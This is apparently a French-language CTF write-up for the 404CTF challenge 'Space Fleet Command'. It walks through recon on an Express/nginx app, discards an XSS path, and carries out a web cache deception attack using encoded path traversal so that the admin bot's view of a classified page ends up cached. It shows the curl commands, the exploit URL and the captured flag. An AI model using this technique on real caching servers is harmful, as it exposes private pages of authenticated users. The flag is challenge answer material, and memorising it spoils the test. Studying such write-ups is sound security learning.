Space Fleet Command
=

Qu'est-ce qu'on a?
-

Sur le site, ça va assez vite. Une page racine, avec un formulaire de recherche permettant de lister des vaisseaux spaciaux. Quand on clique sur un vaisseau, on a une 2ème page, qui donne des détails sur celui-ci. Un bouton en haut à droite permet de rapporter un contenu problématique, en postant l'url voulue.

Analyse des sources
-

Il s'agit d'une petite appli en ExpressJS, avec le strict minimum pour ce qu'on a vu précédemment. Rien de plus dans le code, à part :
- 4 vaisseaux déclarés dans le fichier json, alors qu'on n'en voit que 3. Le 4ème est "classified", et le code source remplace son nom par le flag passé en variable d'environement. Ce vaisseau porte l'id 3. Il n'est visible que par l'admin, qui possède le cookie "token". C'est manifestement la cible du challenge...
- Les pages demandées par le formulaire `/report` sont visitées par un bot, qui possède le cookie `token` et a donc droit de voir le vaisseau cible.
- On a une faille **XSS** dans ce formulaire : si on passe une url invalide qui contient de code html, celui-ci n'est pas transformé dans le message d'erreur.
- Dans l'archive, on a aussi la conf de nginx, ce qui est probablement un indice. Celle-ci dévoile qu'un **cache** est utilisé, mais uniquement sur les fonts du répertoire `/fonts/`. 

Plusieurs pistes :
- XSS
- Cache deception

XSS
-

L'idée serait de faire exécuter un script par le bot, en lui passant une url vulnérable. Le script pourrait alors exfilter soit le cookie, soit le contenu d'une page contenant le flag.

Mais on peut très vite éliminer la piste, pour 2 raisons :
- Le code js pousse l'entête CSP qui interdit les scripts embarqués (`default-src none`). On peut vérifier ça en passant un `<script>` sur le formulaire `/report`. Il s'affiche non transformé dans le message d'erreur, mais il est refusé par le navigateur.
- La seule faille XSS trouvée est sur une méthode `POST` alors que le bot ne peut faire que des `GET`

Cache deception
-

L'idée est de forcer la mise en cache d'un contenu qui nous intéresse, en demandant à l'admin de visiter l'url (formulaire `/report`), puis de demander la même url pour ressortir le contenu du cache. Un contenu intéressant pourrait être `/?q=404` (recherche d'un vaisseau dont le nom commence par le début du flag), ou directement `/spaceship/3`. Mais d'abord, on va étudier cette mise en cache, en partant des infos qu'on a dans la conf.

Pour bien contrôler ce qui se passe, on va utiliser `curl`, et faire un certain nombre de tests. On va utiliser 2 options indispensables : `-i` pour voir les entêtes de la réponse, et `--path-as-is` pour ne pas se faire censurer les urls non canonisées...

Nginx est censé mettre en cache les urls correspondant à l'expression régulière `^/fonts/[a-zA-Z-]+.ttf$`. Autrement dit, l'url doit commencer par `/fonts/` et le nom ne doit contenir que des lettres ou le symbole tiret, puis se finir par `.ttf`.

Plusieurs tests pour vérifier le comportement de nginx : on va commencer par une font qui existe.

```
$ curl --path-as-is -i 'https://spacefleetcommand.404ctf.fr/fonts/Orbitron-Bold.ttf'
HTTP/2 200 
date: Mon, 12 May 2025 02:40:22 GMT
content-type: font/ttf
content-length: 24672
cache-control: public, max-age=3600
last-modified: Sat, 10 May 2025 16:19:23 GMT
etag: W/"6060-196bafe814f"
x-cache-status: HIT
accept-ranges: bytes
strict-transport-security: max-age=31536000; includeSubDomains

Warning: Binary output can mess up your terminal...
```

- `/fonts/Orbitron-Bold.ttf` -> `x-cache-status: HIT` : on a bien sorti cette réponse du cache. Théoriquement, Nginx n'a pas contacté le backend pour cette requête.
- `/fonts/Orbitron-Bold.ttf?123` -> `x-cache-status: MISS` : on est bien passé par le location qui gère le cache, mais cette url n'y était pas. Théoriquement, Nginx a transféré la requête au backend, et a mis la réponse obtenue dans le cache.
- `/fonts/Orbitron-Bold.ttf?123` -> `x-cache-status: HIT` : le cache fonctionne bien. En réutilisant la même url, on a été chercher la réponse dans le cache, sans recontacter le backend.
- `/fonts/inexistant.ttf` -> pas d'entête `x-cache-status`... la 404 renvoyé par le backend, bloque la mise en cache par nginx.

On constate que le comportement correspond bien à la conf, et le cache fonctionne normalement.

Problème : le contenu qui nous intéresse n'est pas dans `/fonts/...`. On va tenter de feinter le `^` de la regex. N'oublions pas l'option `--path-as-is`!
- `/test/../fonts/Orbitron-Bold.ttf` -> `x-cache-status: MISS`

Mais que s'est-il passé? Nginx a canonisé l'url reçue, et l'a donc transformée en `/fonts/Orbitron-Bold.ttf`, ce qui matche l'expression régulière du premier `location`. On a donc trouvé un moyen de mettre en cache une url qui ne commence pas par `/fonts` ! Par contre, on n'est pas encore sûr de l'url passée au backend... canonisée ou pas?

On va tenter de s'attaquer à la cible. Pour `/?q=404` on va être embêté, car l'url doit se terminer par `.ttf` avant la querystring, et la recherche n'est lancée que pour la racine du site. On va s'attaquer plutôt à l'url `/spaceship/3`. Mais pour les tests, on va utiliser un autre vaisseau :
- `/spaceship/0` -> on a le nom du vaisseau dans la page, tout et normal.
- `/spaceship/0/test` -> 404 : le routage `/spaceship/:id` n'est pas respecté.
- `/spaceship/0%2ftest` -> on a bien le nom du vaisseau 0! on peut donc ajouter n'importe quoi derrière le numéro du vaisseu, tant qu'on n'ajoute pas de `/`
- `/spaceship/0%2f..%2f..%2ffonts%2fOrbitron-Bold.ttf` -> `x-cache-status: MISS` : Pas mal! On retombe sur le constat précédent, qui déclenche l'utilisation du cache. Mais on reçoit la font au lieu du vaisseau... Est-ce que l'url passée au backend est canonisée? Si ce n'est pas le cas, c'est que le routage statique est prioritaire, car l'url canonisée correspond à un fichier qui existe. Mais que se passe-t-il avec une font qui n'existe pas?
- `/spaceship/0%2f..%2f..%2ffonts%2finexistant.ttf` -> 2 constats gagnants :
  - pas de 404, mais la page du vaisseau 0. Ca prouve bien que l'url passée au backend n'est pas canonisée ! 
  - `x-cache-status: MISS` : On tombe bien toujours dans le location des fonts, le routage statique ne matche aucun fichier, et celui du spaceship prend le relai! Je crois qu'on a la solution!

On va donc faire un rapport sur l'url `/spaceship/3%2f..%2f..%2ffonts%2finexistant.ttf`, depuis la page du site. Le nom du vaisseau 3 contenant le flag sera révélé au bot qui est admin, et sera également mis en cache par nginx. Il ne restera plus qu'à demander la même url pour récupérer cette page dans le cache :

```bash
$ curl --path-as-is -i 'https://spacefleetcommand.404ctf.fr/spaceship/3%2f..%2f..%2ffonts%2finexistant.ttf'
HTTP/2 200 
date: Mon, 12 May 2025 03:45:41 GMT
content-type: text/html; charset=utf-8
content-length: 1167
content-security-policy: default-src 'self'; script-src 'none';
etag: W/"48f-itEauzI9XKDpH0hoBatIL/br4oI"
x-cache-status: HIT
strict-transport-security: max-age=31536000; includeSubDomains

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>404CTF{a24beb7d0b425ee7} | Space Fleet</title>
...
```

